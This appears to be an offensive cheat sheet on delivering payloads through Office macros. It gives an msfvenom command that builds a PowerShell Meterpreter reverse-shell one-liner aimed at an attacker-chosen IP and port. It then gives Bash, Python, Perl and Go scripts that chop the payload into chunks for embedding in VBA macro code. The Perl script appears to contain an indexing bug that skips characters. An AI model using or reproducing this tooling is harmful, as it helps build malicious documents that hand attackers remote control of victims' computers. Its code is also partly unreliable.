# Payload Delivery

## 01 - Macro Scripts

- Generate a powershell one liner.

```
$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> -f psh-cmd
```

### 1.1 - Bash

`$ cat vba-macro-payload-format.sh`

---

```bash
#!/bin/bash

string=""
chunks=50

for (( i=0; i<${#string}; i+=chunks ))
do
    if [[ ${i} -eq 0 ]]
    then
        echo "string=\"${string:i:chunks}\""
    else
        echo "string+=\"${string:i:chunks}\""
    fi
done
```

### 1.2 - Python

`$ cat vba-macro-payload-format.py`

---

```python
#!/usr/bin/env python

string = ""
n = 50

for i in range(0, len(string), n):
    print("Str = Str + \"" + string[i:i+n] + "\"")
```

`$ cat vba-macro-payload-format.pl`

---

```perl
#!/usr/bin/env perl

my $string = "";

my @characters = ($string =~ /(.)/g);

$concatenated_string = "";

for(my $i = 0; $i < scalar(@characters); $i++) {
    $concatenated_string .= "Str = Str + \"";
    for(my $j = 0; $j < 50; $j++) {
        $concatenated_string .= $characters[$i++];
    }
    $concatenated_string .= chr(34)."\n";
}
print $concatenated_string;
```

`$ cat vba-macro-payload-format.go`

---

```go
package main

import "fmt"

func main() {
    String := ""

    for i := 0; i < len(String); i++ {
        fmt.Print("Str = Str + \"")
        for j := 0; j < 50; j++ {
            if i == len(String) {
                break
            }
            fmt.Printf("%c", String[i])
            i++
        }
        fmt.Print("\"\n")
    }
}
```